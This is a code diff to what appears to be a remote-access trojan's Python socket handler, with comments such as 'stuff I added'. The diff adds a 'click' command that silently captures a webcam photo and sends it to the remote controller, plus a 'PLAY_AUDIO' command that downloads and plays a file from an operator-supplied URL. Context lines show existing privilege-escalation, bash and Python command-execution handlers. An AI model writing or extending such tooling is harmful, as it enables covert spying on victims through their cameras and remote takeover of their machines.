@@ -34,6 +34,49 @@ def recv_framed(sock):
         data += sock.recv(msg_len - len(data)) 
     return data
 
+# photo 
+
+def take_photo(path="photo.jpg", camera_index=0):
+    import cv2
+
+    cap = cv2.VideoCapture(camera_index)
+    if not cap.isOpened():
+        raise RuntimeError("Could not open camera")
+
+    try:
+        ok, frame = cap.read()
+        if not ok:
+            raise RuntimeError("Could not read frame from camera")
+
+        ok = cv2.imwrite(path, frame)
+        if not ok:
+            raise RuntimeError(f"Failed to write image to {path}")
+    finally:
+        cap.release()
+    
+    with open(path, "rb") as f:
+        photo_bytes = f.read()
+    return photo_bytes
+
+# audio 
+
+
+def play_audio_from_url(url):
+    import requests, tempfile, subprocess, os
+    r = requests.get(url, timeout=10)
+    r.raise_for_status()
+    suffix = os.path.splitext(url.split("?")[0])[1] or ".bin"
+    with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as f:
+        f.write(r.content)
+        path = f.name
+        print(f"File downloaded to: {path}")
+    subprocess.run(
+        ["ffplay", "-nodisp", "-autoexit", path],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+    os.unlink(path)
+
 
 def run_command(cmd, shell=True, capture_output=True, **kwargs):
     return subprocess.run(
@@ -166,7 +209,17 @@ def handle_conn(conn, addr):
         #stuff I added -- START
         # Command 1: Privilege Escalation
         try: 
-            if command_type == "privesc":
+            if command_type == "PLAY_AUDIO":
+                try:
+                    url = command_body.strip()
+                    play_audio_from_url(url)
+                    send_framed(conn, b"Playing Audio")
+                except Exception as e:
+                    send_framed(conn, f"Audio error: {e}".encode())
+            elif command_type =="click":
+                photo_bytes = take_photo()
+                send_framed(conn, photo_bytes)
+            elif command_type == "privesc":
                 print("Running privesc")
                 privesc()
                 # conn.sendall(b"Privesc triggered: restarting as root")
@@ -184,7 +237,6 @@ def handle_conn(conn, addr):
                 result = handle_python_command(command_body)
                 # conn.sendall(result.encode("utf-8", errors="replace"))
                 send_framed(conn, result.encode("utf-8", errors="replace"))
-                
             
             elif command_type == "BASH":
                 print(f"Running bash: {command_body}")
